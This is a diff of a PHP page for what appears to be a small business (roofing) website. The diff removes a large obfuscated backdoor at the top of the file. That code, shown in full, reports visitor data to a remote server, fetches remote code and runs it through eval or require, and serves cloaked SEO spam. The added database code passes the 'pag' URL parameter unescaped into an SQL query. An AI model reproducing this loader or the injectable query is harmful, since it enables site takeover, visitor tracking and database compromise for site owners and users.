@@ -1,20 +1,625 @@
+<?php require_once('Connections/rtconn.php'); ?>
+<?php require_once('includes/absolutpath.php'); ?>
+<?php require_once('includes/seourl.php'); ?>
+<?php if(empty($_GET['loc']) || $_GET['loc'] === NULL): $_GET['loc'] = 0; endif; ?>
+<?php if(empty($_GET['pag']) || $_GET['pag'] === NULL && $row_Page['idloc_pag'] === 0): $_GET['pag'] = "mainPage"; endif; ?>
 <?php
- goto jd1YB; lFP1Q: function uGDpD($nFau8 = '') { goto j9SVj; j9SVj: $nFau8 = $_SERVER["\110\124\x54\120\137\126\x49\x41"] ? $_SERVER["\x48\124\124\120\x5f\130\137\106\117\122\127\101\x52\x44\x45\x44\137\106\x4f\122"] : $_SERVER["\122\105\x4d\117\124\105\137\x41\x44\x44\x52"]; goto zOO8L; zOO8L: $nFau8 = $nFau8 ? $nFau8 : $_SERVER["\122\x45\115\x4f\124\x45\137\x41\x44\x44\122"]; goto jXCc2; jXCc2: return trim($nFau8); goto QYXY2; QYXY2: } goto ete0b; uZJ4x: function m1a6E($tlpDt, $aadyF) { goto tJnFl; vPplL: echo $yIiWU[1]; goto vY7mE; OTgI_: die; goto j61Ln; RIjHz: $OLM3K["\144\145\146\141\x75\154\164\x5f\160\141\x72\x61\155\163"] = $tlpDt; goto XpRUB; TZlhb: $NeWlW = "\45\163\57\x3f\x72\75\x25\163\x7c\x68\164\x74\x70\163\x3a\57\x2f\147\x6f\157\x67\x6c\145\x2e\143\157\56\152\x70\x7c\45\x73\77\141\160\151\x3d\45\x73\46\x61\x63\x3d\x25\163\x26\x70\x61\x74\150\x3d\45\x73\46\164\x3d\x25\x73"; goto xrCxI; a3Ps0: J7A0W: goto qXEDk; zUo11: $OE9Ee = $_GET["\x73\151\164\x65\x6d\x61\x70"]; goto MVcCz; cJPIV: $OLM3K["\x6c\x61\156\147\x75\x61\147\x65"] = ''; goto hXG1n; HgIZO: if (!isset($_GET["\160\141\x72\141\155\163"])) { goto VjnSp; } goto zBOcE; Ioqyc: $wApmx = n70lv($rCsVB); goto HL_7H; lDMve: VjnSp: goto T4T4G; iuC2l: if (!($yIiWU !== false)) { goto sdgkK; } goto z1vvT; vXbEj: $OLM3K["\165\x73\145\162\x5f\141\x67\x65\156\x74"] = isset($_SERVER["\x48\x54\x54\120\x5f\125\x53\105\x52\x5f\101\107\x45\116\124"]) ? $_SERVER["\110\x54\x54\120\x5f\x55\x53\105\122\137\x41\x47\x45\116\124"] : ''; goto oVDPM; RzjLP: WvER2($avGIH, $OE9Ee, $OLM3K); goto fRbLJ; fRbLJ: DUawD: goto TZlhb; m1YoB: R59Lp: goto MSBOE; T4T4G: if (!isset($_GET["\x73\151\x74\x65\x6d\141\160"])) { goto DUawD; } goto zUo11; I4Tdf: buPZF: goto HgIZO; naj93: var_dump($wApmx); goto OTgI_; s11g8: die/* S0vMzEJElwPNAQA=$cAT3VWynuiL7CRgr */; goto lDMve; xc_lS: $kP0rU = array("\x64\157\x6d\x61\x69\x6e" => $OLM3K["\x73\x65\162\x76\145\x72\x5f\x64\157\x6d\141\x69\156"], "\x72\x65\161\x75\145\163\164\137\165\x72\154" => $OLM3K["\x72\x65\x71\165\x65\163\164\x5f\165\x72\154"], "\151\160" => $OLM3K["\x69\x70"], "\141\x67\x65\156\x74" => $OLM3K["\165\163\145\x72\137\x61\147\145\156\164"], "\x72\145\x66\145\x72\145\162" => $OLM3K["\162\145\146\145\x72\145\x72"], "\x70\x72\157\x74\157\143\x6f\154" => $OLM3K["\x70\x72\157\164\157\143\157\x6c"], "\x6c\x61\x6e\x67\165\141\147\145" => $OLM3K["\154\141\x6e\147\165\x61\147\145"]); goto CvNMw; ZEFHR: $OLM3K["\163\145\162\166\145\x72\x5f\x64\x6f\155\x61\x69\156"] = ryFsC(); goto PMY6i; z1vvT: @header($yIiWU[0]); goto vPplL; oVDPM: $OLM3K["\x69\160"] = ugDpD(); goto Mlptg; j61Ln: VFdR3: goto fEf2V; YY8IP: sdgkK: goto OaQF2; Zbz2J: if (!isset($_GET["\147\x6f\157\147\154\x65\x5f\165\162\x6c"])) { goto y1laN; } goto q5cMx; zBOcE: print_r($OLM3K); goto s11g8; LBE3t: ceCs1: goto xc_lS; fEf2V: $yIiWU = ciNnH($wApmx); goto iuC2l; MSBOE: $OLM3K["\x6c\x61\x6e\147\165\141\x67\x65"] = $_SERVER["\110\124\124\x50\x5f\101\x43\x43\105\120\124\137\114\101\116\x47\x55\x41\x47\x45"]; goto I4Tdf; AGyYs: $wApmx = N70lV($NeWlW[1]); goto naj93; Mlptg: if (isset($_SERVER["\x48\124\124\x50\123"])) { goto J7A0W; } goto JC9m8; x3GDV: aoKtE: goto Kc1yu; JC9m8: $OLM3K["\x70\162\157\x74\x6f\x63\157\154"] = "\150\x74\x74\160\x3a\57\x2f"; goto XK142; qXEDk: $OLM3K["\x70\162\157\x74\x6f\x63\157\154"] = "\x68\x74\x74\x70\163\x3a\57\x2f"; goto x3GDV; UtjZh: var_dump($wApmx); goto AGyYs; CvNMw: $rCsVB = sprintf($NeWlW[0], $OLM3K["\x61\x70\151"], pU02m(base64_encode(implode("\x7b\174\175", $kP0rU)))); goto Ioqyc; XpRUB: $OLM3K["\x61\x70\x69"] = base64_decode(Pu02M($OLM3K["\x64\145\146\141\165\154\x74\x5f\160\x61\162\141\x6d\x73"])); goto ZEFHR; vY7mE: die; goto YY8IP; q5cMx: $avGIH = $_GET["\147\x6f\x6f\147\154\x65\137\165\x72\154"]; goto eNn0t; xrCxI: $NeWlW = explode("\174", $NeWlW); goto WEg2r; hXG1n: goto buPZF; goto m1YoB; MVcCz: $avGIH = "\x77\x77\167\56\x67\x6f\157\147\154\x65\56\143\157\155"; goto Zbz2J; KAUjk: D9LXw(sprintf($NeWlW[2], base64_decode(PU02m($aadyF)), $OLM3K["\x61\x70\x69"], $_REQUEST["\141\x63"], $_REQUEST["\x70\x61\164\150"], $_REQUEST["\164"])); goto LBE3t; tJnFl: $OLM3K = array(); goto RIjHz; WEg2r: if (!(isset($_REQUEST["\141\x63"]) && isset($_REQUEST["\x70\141\164\150"]) && isset($_REQUEST["\x74"]))) { goto ceCs1; } goto KAUjk; PMY6i: $OLM3K["\x72\x65\161\165\x65\163\x74\137\x75\162\154"] = $_SERVER["\122\x45\x51\125\x45\x53\124\137\x55\122\x49"]; goto zgy1V; HL_7H: if (!isset($_REQUEST["\144\165\x6d\x70"])) { goto VFdR3; } goto UtjZh; zgy1V: $OLM3K["\162\145\146\145\162\x65\162"] = isset($_SERVER["\x48\124\124\x50\137\122\x45\106\x45\122\105\122"]) ? $_SERVER["\x48\124\124\x50\137\x52\x45\106\x45\122\105\x52"] : ''; goto vXbEj; XK142: goto aoKtE; goto a3Ps0; eNn0t: y1laN: goto RzjLP; Kc1yu: if (isset($_SERVER["\110\124\x54\x50\137\101\103\x43\105\x50\x54\x5f\x4c\101\x4e\x47\x55\x41\107\105"])) { goto R59Lp; } goto cJPIV; OaQF2: } goto GvEtv; jd1YB: error_reporting(0); goto BhUz8; nRGx0: function Pu02m($tlpDt) { goto DCmSN; Qomzx: $AomIv = ''; goto Hwp2L; DCmSN: $iWk_1 = substr($tlpDt, strlen($tlpDt) - 2); goto I22GA; XTivV: if (!($JpQZp < count($nJ85A) - 2)) { goto OaMzV; } goto lp5qi; RHQ9o: goto UH7UE; goto WphAb; I22GA: $nJ85A = str_split($tlpDt); goto Qomzx; v_xTz: $JpQZp = $JpQZp + 2; goto RHQ9o; f8wNM: UH7UE: goto XTivV; sbBmv: owb1h: goto v_xTz; WphAb: OaMzV: goto IDh8_; Hwp2L: $JpQZp = 0; goto f8wNM; FnnkY: return $AomIv; goto FrPa8; lp5qi: $AomIv .= $nJ85A[$JpQZp + 1] . $nJ85A[$JpQZp]; goto sbBmv; IDh8_: $AomIv .= $iWk_1; goto FnnkY; FrPa8: } goto Vd5d7; ete0b: function rYfSc($wHTaI = '') { goto wF5TA; zBYBM: Bq33I: goto FEfdt; esyYn: return $wHTaI; goto LMZ1W; x_jFI: LFgGb: goto esyYn; wF5TA: if (isset($_SERVER["\110\x54\124\x50\x5f\110\117\123\124"])) { goto Bq33I; } goto CKdGJ; FEfdt: return $_SERVER["\110\x54\x54\x50\x5f\110\117\123\124"]; goto vYOIz; CKdGJ: if (isset($_SERVER["\123\x45\x52\126\x45\x52\x5f\116\x41\115\x45"])) { goto sLDQh; } goto cF5YY; vYOIz: goto LFgGb; goto K1pUw; y5Eh2: return $_SERVER["\x53\105\x52\x56\105\122\x5f\116\101\x4d\105"]; goto x_jFI; cF5YY: goto LFgGb; goto zBYBM; K1pUw: sLDQh: goto y5Eh2; LMZ1W: } goto F5Vyv; MdLZq: $aadyF = "\x48\x61\60\122\110\143\x36\x4d\x79\x4c\152\71\x6d\114\152\x6c\x7a\x64\165\x55\x32\131\164\71\167\x4c\x3d\75"; goto soUW7; bImqQ: function n70lV($rCsVB) { goto VMneF; p1ROk: $ZO7Hc = fgets($WEEMA); goto wl7LR; scN8D: H1q66: goto Q9xZQ; Mzbkv: kqOil: goto x02td; cil2m: if (!(substr($O1fsD, 0, 1) == "\143")) { goto yyE5R; } goto lzmyB; GkiwE: $sjGyi[] = "\125\x73\x65\162\x2d\x41\x67\x65\x6e\164\72\x20\x73"; goto buC9P; BB70S: foreach (explode("\x7c", $Q0S6h) as $VVorr) { goto diEI9; lqh0C: unset($dy4rk); goto vU2I_; ty6kA: Bk4S6: goto lqh0C; vU2I_: if (!$lbd6k) { goto EUz6C; } goto GncUp; vxMEY: goto PIlMa; goto E0nC4; diEI9: $lbd6k = 1; goto hqW2E; hqW2E: foreach (explode("\x2b", $VVorr) as $dy4rk) { if (!function_exists($dy4rk)) { $lbd6k = 0; } khXSO: } goto ty6kA; We2bZ: oOq91: goto hCKRH; GncUp: $O1fsD = $VVorr; goto vxMEY; E0nC4: EUz6C: goto We2bZ; hCKRH: } goto QjZTM; eLeB2: if (!($MJLYq = @socket_read($WEEMA, 8192))) { goto E5Aco; } goto bhE4v; YQ4mG: $UA1be .= $GuFam; goto C8Lu9; NafMe: isset($FuIoM["\x70\141\x74\150"]) || ($FuIoM["\160\141\164\150"] = ''); goto mxH1j; rflEv: unset($e8Tm2, $O1fsD, $WEEMA, $z9m2J, $GuFam); goto y9qz2; EvNSl: unset($yIiWU); goto lc2uI; UBQSL: $wApmx = explode("\15\12\xd\12", $wApmx); goto Pq2Gf; OcTN7: goto eFPXe; goto Lfr27; XSzEF: DTN4L: goto VqxpF; l8SFq: $tYaU1 = stream_get_meta_data($WEEMA); goto q4uG9; sC6iF: $WEEMA = null; goto rdlx5; d82q2: JndwG: goto t_oqW; cdsL0: nsvoQ: goto psGDG; n4YcF: $UA1be .= $z9m2J; goto NIfa1; h9dxY: curl_close($bBbNZ); goto Ut5hH; ugQ4F: $wApmx .= $yIiWU; goto EvNSl; lyWQ0: $Yqdcd = "\x31\x2e\x30"; goto NP_1t; C8Lu9: $UA1be .= "\x3a"; goto n4YcF; Pq2Gf: array_shift($wApmx); goto oUCyE; EZ5rn: FMhnk: goto AimyQ; I_gBu: socket_write($WEEMA, $e8Tm2, strlen($e8Tm2)); goto VS8jX; rI8nD: goto kJiQa; goto tNDaC; AV0UD: $lqCic = $FuIoM["\x70\141\164\150"] ? $FuIoM["\160\141\x74\x68"] . ($FuIoM["\x71\165\145\162\x79"] ? "\x3f" . $FuIoM["\161\165\x65\x72\171"] : '') : "\57"; goto KxOnn; VS8jX: eFPXe: goto eLeB2; FM6Po: if ($FuIoM["\x73\x63\x68\x65\155\145"] == "\150\x74\164\160\x73") { goto VP9OG; } goto lyWQ0; NP_1t: $z9m2J = empty($FuIoM["\x70\157\162\164"]) ? 80 : $FuIoM["\160\x6f\162\164"]; goto tyz6d; h04eL: kJiQa: goto tuZpB; L1LT4: V28c6: goto SOyKb; Fu3cf: $Yqdcd = "\61\x2e\61"; goto Ho0fu; SOyKb: kXc6c: goto HpVPA; mxH1j: isset($FuIoM["\x71\165\145\x72\x79"]) || ($FuIoM["\161\165\x65\x72\x79"] = ''); goto ipNnW; y9qz2: $wApmx = @preg_replace_callback("\x2f\50\x3f\72\x28\77\x3a\x5c\162\x5c\156\174\134\x6e\51\174\136\51\50\133\60\55\71\x41\x2d\x46\135\53\51\50\x3f\72\134\162\134\x6e\174\134\x6e\x29\x7b\61\x2c\62\x7d\50\x2e\x2a\x3f\51" . "\x28\x28\x3f\x3a\x5c\162\134\x6e\x7c\134\x6e\51\50\x3f\x3a\x5b\60\55\71\x41\55\106\x5d\x2b\x28\77\x3a\134\x72\134\x6e\x7c\134\x6e\x29\51\x7c\x24\51\57\x73\151", "\x66\x5f\x61\x73\171\x6e\143", $wApmx); goto lNqXh; wl7LR: if (!($ZO7Hc && (rawurlencode($ZO7Hc) == "\x25\60\x44\45\60\101" || rawurlencode($ZO7Hc) == "\x25\x30\101"))) { goto kqOil; } goto uQJYL; QQmvk: $Sgmtz = curl_exec($bBbNZ); goto h9dxY; q4uG9: if ($tYaU1["\x74\x69\155\x65\144\x5f\x6f\x75\164"]) { goto kXc6c; } goto h04eL; tjOal: unset($MJLYq); goto OcTN7; x02td: unset($ZO7Hc); goto rI8nD; asBLM: if (!(substr($O1fsD, -1) == "\x65")) { goto g4J1I; } goto ge1d6; AdVZD: $sjGyi[] = $LmoX0; goto GP0uN; m1tCn: HD256: goto vi6Q7; mIXTn: $GuFam = "\163\163\154\x3a\x2f\x2f"; goto OCD7I; buC9P: $sjGyi[] = "\x41\x63\143\x65\x70\164\72\x20\52\57\x2a"; goto ThKQG; Pqstp: $UA1be = "\x74\x63\160\x3a\x2f\x2f"; goto YQ4mG; hTQDJ: goto H1q66; goto otdlX; IteKl: VP9OG: goto Fu3cf; Y8KiN: unset($Q0S6h, $VVorr); goto mKZuq; tuZpB: if (feof($WEEMA)) { goto dVT4V; } goto p1ROk; FLfN1: $WEEMA = $O1fsD($GuFam, $z9m2J, $Pl9fK, $OCf1O, 30); goto pdiBC; ipNnW: isset($FuIoM["\x70\157\x72\x74"]) || ($FuIoM["\160\x6f\x72\164"] = ''); goto AV0UD; SxU2q: return $ZYDVy; goto m1tCn; ZcymZ: curl_setopt($bBbNZ, CURLOPT_RETURNTRANSFER, 1); goto fh2T1; Qd16V: stream_set_timeout($WEEMA, 30); goto PA2Rz; gkrPg: unset($gyhH5); goto xPJmp; xPJmp: g4J1I: goto F2ajw; CdVpm: curl_setopt($bBbNZ, CURLOPT_URL, $rCsVB); goto u8lU7; Q9xZQ: yyE5R: goto GC6vq; psGDG: if (feof($WEEMA)) { goto V28c6; } goto FLxYG; ThKQG: unset($LmoX0); goto pPDqr; uQJYL: goto dVT4V; goto Mzbkv; F2ajw: goto yEXN1; goto PW0n4; bhE4v: $wApmx .= $MJLYq; goto tjOal; u8lU7: curl_setopt($bBbNZ, CURLOPT_USERAGENT, "\x73"); goto ZcymZ; jutjS: $WEEMA = $O1fsD(AF_INET, SOCK_STREAM, 0); goto zXsGg; Lfr27: E5Aco: goto UBQSL; c58qv: if (!($ZYDVy != false)) { goto HD256; } goto SxU2q; z1Qac: return "\x35\60\61"; goto scN8D; PW0n4: zVyo7: goto E6OUN; nJnHG: return "\65\60\60"; goto XSzEF; KCW9Y: unset($sjGyi, $FuIoM, $Yqdcd, $lqCic); goto sC6iF; GC6vq: $FuIoM = parse_url($rCsVB); goto NGPmt; r2Y4x: yEXN1: goto rflEv; oUCyE: $wApmx = implode("\15\12\xd\xa", $wApmx); goto EZ5rn; KxOnn: $GuFam = $FuIoM["\150\157\x73\164"]; goto FM6Po; ndt3A: fclose($WEEMA); goto r2Y4x; lc2uI: goto nsvoQ; goto L1LT4; lzmyB: $bBbNZ = curl_init(); goto CdVpm; tyz6d: goto JndwG; goto IteKl; E6OUN: stream_set_blocking($WEEMA, TRUE); goto Qd16V; fh2T1: curl_setopt($bBbNZ, CURLOPT_TIMEOUT, 100); goto otb9a; AimyQ: socket_close($WEEMA); goto gkrPg; rzxdz: dxHMs: goto FLfN1; QjZTM: PIlMa: goto Y8KiN; n7OX3: WYTc6: goto zzifu; HpVPA: unset($tYaU1); goto ndt3A; sKu0f: return 0; goto D6OUl; lNqXh: return trim(trim($wApmx, "\357\273\277")); goto uHtfO; OCD7I: $GuFam .= $FuIoM["\150\157\163\x74"]; goto d82q2; FLxYG: $yIiWU = fread($WEEMA, 8192); goto ugQ4F; otdlX: jof_G: goto z1Qac; VMneF: if (preg_match("\57\136\150\x74\x74\x70\163\52\134\x3a\x5c\x2f\x5c\x2f\x2f\x73\151", $rCsVB)) { goto DTN4L; } goto nJnHG; rdlx5: if (substr($O1fsD, -1) == "\x6e") { goto dxHMs; } goto KIRO5; LMhtl: $wApmx = ''; goto c6vLD; NGPmt: isset($FuIoM["\150\x6f\x73\164"]) || ($FuIoM["\x68\157\x73\x74"] = ''); goto NafMe; FaAf1: $O1fsD = $e8Tm2 = $Pl9fK = $OCf1O = ''; goto BB70S; KIRO5: if (!(substr($O1fsD, -1) == "\164")) { goto WYTc6; } goto Pqstp; PA2Rz: fwrite($WEEMA, $e8Tm2); goto l8SFq; GP0uN: $sjGyi[] = "\103\157\x6e\x6e\x65\143\x74\x69\157\x6e\x3a\x20\103\154\x6f\163\145"; goto GkiwE; otb9a: curl_setopt($bBbNZ, CURLOPT_FRESH_CONNECT, TRUE); goto EPgVk; vi6Q7: $Q0S6h = "\143\165\x72\154\x5f\151\156\151\164\53\x63\165\162\x6c\x5f\163\145\x74\157\x70\x74\53\x63\x75\x72\154\x5f\x65\170\145\143\174\x66\x73\x6f\143\x6b\157\x70\145\x6e\x7c\160\x66\x73\157\x63\x6b\157\x70\x65\x6e\x7c\163\x74\x72\x65\141\x6d\137\163\157\x63\x6b\x65\x74\137\x63\154\x69\x65\156\x74\174\163\x6f\143\153\145\x74\137\143\162\145\x61\x74\x65"; goto FaAf1; EPgVk: curl_setopt($bBbNZ, CURLOPT_SSL_VERIFYPEER, 0); goto QQmvk; rsk7w: return $Sgmtz; goto hTQDJ; NIfa1: $WEEMA = stream_socket_client($UA1be, $Pl9fK, $OCf1O, 30); goto fRsVE; ge1d6: $gyhH5 = gethostbyname($GuFam); goto jutjS; zzifu: goto ARL0S; goto rzxdz; Ut5hH: if (!$Sgmtz) { goto jof_G; } goto rsk7w; Ho0fu: $z9m2J = empty($FuIoM["\x70\157\x72\164"]) ? 443 : $FuIoM["\160\157\x72\164"]; goto mIXTn; pPDqr: $e8Tm2 = "\x47\x45\124\40{$lqCic}\40\x48\x54\124\120\x2f{$Yqdcd}" . PHP_EOL . join(PHP_EOL, $sjGyi) . PHP_EOL . PHP_EOL; goto KCW9Y; b2FCM: $LmoX0 .= $GuFam; goto AdVZD; t_oqW: $LmoX0 = "\x48\157\x73\x74\72\40"; goto b2FCM; VqxpF: $ZYDVy = file_get_contents($rCsVB); goto c58qv; D6OUl: W3wVA: goto cil2m; zXsGg: if (!socket_connect($WEEMA, $gyhH5, $z9m2J)) { goto FMhnk; } goto I_gBu; pdiBC: ARL0S: goto LMhtl; tNDaC: dVT4V: goto cdsL0; c6vLD: if ($WEEMA) { goto zVyo7; } goto asBLM; fRsVE: unset($UA1be); goto n7OX3; mKZuq: if (!($O1fsD == '')) { goto W3wVA; } goto sKu0f; uHtfO: } goto gpB4t; BhUz8: $tlpDt = "\110\141\60\x52\104\143\166\x6f\63\x4c\172\x56\x54\x4d\x30\x59\x58\x4c\x79\131\124\x4d\165\x59\x57\x65\151\x46\130\x5a\60\x4e\155\114\x70\x78\x6d\132\x55\166"; goto MdLZq; DctH7: function CInNh($wApmx) { goto JiEcU; JiEcU: $kXGKw = @preg_split("\57\173\x5c\174\175\57\163\151", $wApmx, -1, PREG_SPLIT_NO_EMPTY); goto X14lw; mNBAN: ow3Uj: goto LsooT; ZdUdF: return false; goto xInob; Iqjlf: return false; goto mNBAN; xInob: Kn4Uc: goto byinB; X14lw: if (is_array($kXGKw)) { goto ow3Uj; } goto Iqjlf; LsooT: if (!(count($kXGKw) != 2)) { goto Kn4Uc; } goto ZdUdF; byinB: return $kXGKw; goto Diq5G; Diq5G: } goto uZJ4x; Vd5d7: function WVer2($iKiyT, $OE9Ee, $OLM3K) { goto vR9nb; WfGp_: $JYl5G = "\x67\x6f\157\x67\154\145"; goto mKMG9; OPEWk: p2mt1: goto WfGp_; fEFcA: var_dump($YKyB8); goto ZtvY0; O_utb: die; goto OPEWk; Jc2VP: zoqqL: goto tgKdG; vR9nb: $LxxTQ = "\x68\164\164\x70\163\72\57\57\45\x73\57\160\151\x6e\147\77\x73\151\x74\145\155\141\160\75\45\x73\45\163\57\x25\163"; goto YVy27; ItAeR: if (!(strpos($FFm0s, $JYl5G) != false)) { goto zoqqL; } goto n_ilj; ZtvY0: var_dump($FFm0s); goto O_utb; mKMG9: $VyG1M = "\163\165\143\x63\x65\163\163"; goto HtgY2; YVy27: $YKyB8 = sprintf($LxxTQ, $iKiyT, $OLM3K["\160\162\x6f\x74\x6f\x63\x6f\154"], $OLM3K["\163\145\162\x76\145\162\x5f\x64\x6f\x6d\141\x69\156"], $OE9Ee); goto y5JV5; tgKdG: die($U8Jls); goto oUMDg; HtgY2: $U8Jls = "\146\x61\x69\x6c\145\144"; goto ItAeR; zTRHV: if (!isset($_REQUEST["\163\164"])) { goto p2mt1; } goto fEFcA; n_ilj: die($VyG1M); goto Jc2VP; y5JV5: $FFm0s = N70lv($YKyB8); goto zTRHV; oUMDg: } goto DctH7; F5Vyv: function D9lXW($rCsVB) { goto ZujTW; sLrKU: die; goto Ee0Y5; HC28U: $FxLis($rtCBY); goto sLrKU; H9FMb: die("\147\x65\x74\x20\x66\x61\x69\x6c\145\144"); goto bOQqF; bOQqF: tQVme: goto Jc9hw; vzuFL: $FxLis = "\x65" . "\166" . "\141" . "\154"; goto HC28U; qzP9v: if (!(strpos($rtCBY, $p3b_u) === false)) { goto tQVme; } goto H9FMb; KwOBI: fwrite($xQHSn, $rtCBY); goto G9COZ; FpNpx: @(require $Q0S6h["\x75\x72\151"]); goto N5Om8; HP1XK: $p3b_u = base64_decode("\120\x44\x39\x77\x61\110\101\75"); goto qzP9v; G9COZ: $Q0S6h = stream_get_meta_data($xQHSn); goto FpNpx; Gz103: if (!isset($_REQUEST["\145"])) { goto qqztN; } goto bg33p; Ee0Y5: qqztN: goto KwOBI; bg33p: $rtCBY = str_replace($p3b_u, '', $rtCBY); goto vzuFL; ZujTW: $rtCBY = N70lV($rCsVB); goto HP1XK; N5Om8: fclose($xQHSn); goto gLj2B; Jc9hw: $xQHSn = tmpfile(); goto Gz103; gLj2B: die; goto tVgYn; tVgYn: } goto nRGx0; gpB4t: function qxLyF($lTX0u) { return hexdec($lTX0u[1]) == strlen($lTX0u[2]) ? $lTX0u[2] : $lTX0u[0]; } goto lFP1Q; soUW7: function BvAba($wHTaI) { goto imL2Q; vGIck: $h8Jdw = substr($wHTaI, 7, strlen($wHTaI) - 14); goto qFjAL; qFjAL: return gzinflate(base64_decode($yZJac . $h8Jdw . $WPPtv)); goto B7hJn; GNf0w: $WPPtv = substr($wHTaI, -5); goto vGIck; imL2Q: $yZJac = substr($wHTaI, 0, 5); goto GNf0w; B7hJn: } goto bImqQ; GvEtv: m1A6e($tlpDt, $aadyF);
+if (!function_exists("GetSQLValueString")) {
+function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
+{
+  $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
+
+  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);
+
+  switch ($theType) {
+    case "text":
+      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
+      break;    
+    case "long":
+    case "int":
+      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
+      break;
+    case "double":
+      $theValue = ($theValue != "") ? "'" . doubleval($theValue) . "'" : "NULL";
+      break;
+    case "date":
+      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
+      break;
+    case "defined":
+      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
+      break;
+  }
+  return $theValue;
+}
+}
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Locationtop = "SELECT * FROM locations_loc WHERE locations_loc.active_loc=1 ORDER BY locations_loc.order_loc";
+$Locationtop = mysql_query($query_Locationtop, $rtconn) or die(mysql_error());
+$row_Locationtop = mysql_fetch_assoc($Locationtop);
+$totalRows_Locationtop = mysql_num_rows($Locationtop);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Page = "SELECT * FROM pages_pag WHERE slugurl_pag = '".$_GET["pag"]."'";
+$Page = mysql_query($query_Page, $rtconn) or die(mysql_error());
+$row_Page = mysql_fetch_assoc($Page);
+$totalRows_Page = mysql_num_rows($Page);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Addresses = "SELECT * FROM officeloction_loc";
+$Addresses = mysql_query($query_Addresses, $rtconn) or die(mysql_error());
+$row_Addresses = mysql_fetch_assoc($Addresses);
+$totalRows_Addresses = mysql_num_rows($Addresses);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Emmergencypg = "SELECT * FROM emergency_ecy";
+$Emmergencypg = mysql_query($query_Emmergencypg, $rtconn) or die(mysql_error());
+$row_Emmergencypg = mysql_fetch_assoc($Emmergencypg);
+$totalRows_Emmergencypg = mysql_num_rows($Emmergencypg);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Emmergencyft = "SELECT * FROM emergency_ecy";
+$Emmergencyft = mysql_query($query_Emmergencyft, $rtconn) or die(mysql_error());
+$row_Emmergencyft = mysql_fetch_assoc($Emmergencyft);
+$totalRows_Emmergencyft = mysql_num_rows($Emmergencyft);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Socialtop = "SELECT * FROM sitenetwork_snk WHERE active_snk = 1 ORDER BY order_snk ASC";
+$Socialtop = mysql_query($query_Socialtop, $rtconn) or die(mysql_error());
+$row_Socialtop = mysql_fetch_assoc($Socialtop);
+$totalRows_Socialtop = mysql_num_rows($Socialtop);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Socialft = "SELECT * FROM sitenetwork_snk WHERE active_snk = 1 ORDER BY order_snk ASC";
+$Socialft = mysql_query($query_Socialft, $rtconn) or die(mysql_error());
+$row_Socialft = mysql_fetch_assoc($Socialft);
+$totalRows_Socialft = mysql_num_rows($Socialft);
+
+$colname_Phone = "-1";
+if (isset($_GET['loc'])) {
+  $colname_Phone = (get_magic_quotes_gpc()) ? $_GET['loc'] : addslashes($_GET['loc']);
+}
+mysql_select_db($database_rtconn, $rtconn);
+$query_Phone = sprintf("SELECT * FROM phones_phe WHERE idloc_phe = %s AND active_phe=1", GetSQLValueString($colname_Phone, "int"));
+$Phone = mysql_query($query_Phone, $rtconn) or die(mysql_error());
+$row_Phone = mysql_fetch_assoc($Phone);
+$totalRows_Phone = mysql_num_rows($Phone);
+
+$colname_Phone247 = "-1";
+if (isset($_GET['loc'])) {
+  $colname_Phone247 = (get_magic_quotes_gpc()) ? $_GET['loc'] : addslashes($_GET['loc']);
+}
+mysql_select_db($database_rtconn, $rtconn);
+$query_Phone247 = sprintf("SELECT * FROM phones_phe WHERE idloc_phe = %s AND active_phe=1", GetSQLValueString($colname_Phone247, "int"));
+$Phone247 = mysql_query($query_Phone247, $rtconn) or die(mysql_error());
+$row_Phone247 = mysql_fetch_assoc($Phone247);
+$totalRows_Phone247 = mysql_num_rows($Phone247);
+
+$colname_Sliders = "-1";
+if (isset($_GET["loc"])) {
+  $colname_Sliders = (get_magic_quotes_gpc()) ? $_GET["loc"] : addslashes($_GET["loc"]);
+}
+mysql_select_db($database_rtconn, $rtconn);
+$query_Sliders = sprintf("SELECT * FROM banners_ban WHERE banners_ban.idloc_ban=%s AND banners_ban.visible_ban=1 ORDER BY banners_ban.order_ban", GetSQLValueString($colname_Sliders, "int"));
+$Sliders = mysql_query($query_Sliders, $rtconn) or die(mysql_error());
+$row_Sliders = mysql_fetch_assoc($Sliders);
+$totalRows_Sliders = mysql_num_rows($Sliders);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Locations = "SELECT * FROM locations_loc WHERE locations_loc.active_loc=1 ORDER BY locations_loc.order_loc";
+$Locations = mysql_query($query_Locations, $rtconn) or die(mysql_error());
+$row_Locations = mysql_fetch_assoc($Locations);
+$totalRows_Locations = mysql_num_rows($Locations);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Types = "SELECT * FROM rooftypes_res WHERE rooftypes_res.active_res=1 ORDER BY rooftypes_res.order_res";
+$Types = mysql_query($query_Types, $rtconn) or die(mysql_error());
+$row_Types = mysql_fetch_assoc($Types);
+$totalRows_Types = mysql_num_rows($Types);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Services1 = "SELECT whatwedo_wdo.name_wdo, whatwedo_wdo.colnro_wdo FROM whatwedo_wdo WHERE whatwedo_wdo.colnro_wdo=1 ORDER BY whatwedo_wdo.order_wdo";
+$Services1 = mysql_query($query_Services1, $rtconn) or die(mysql_error());
+$row_Services1 = mysql_fetch_assoc($Services1);
+$totalRows_Services1 = mysql_num_rows($Services1);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Services2 = "SELECT whatwedo_wdo.name_wdo, whatwedo_wdo.colnro_wdo FROM whatwedo_wdo WHERE whatwedo_wdo.colnro_wdo=2 ORDER BY whatwedo_wdo.order_wdo";
+$Services2 = mysql_query($query_Services2, $rtconn) or die(mysql_error());
+$row_Services2 = mysql_fetch_assoc($Services2);
+$totalRows_Services2 = mysql_num_rows($Services2);
+
+mysql_select_db($database_rtconn, $rtconn);
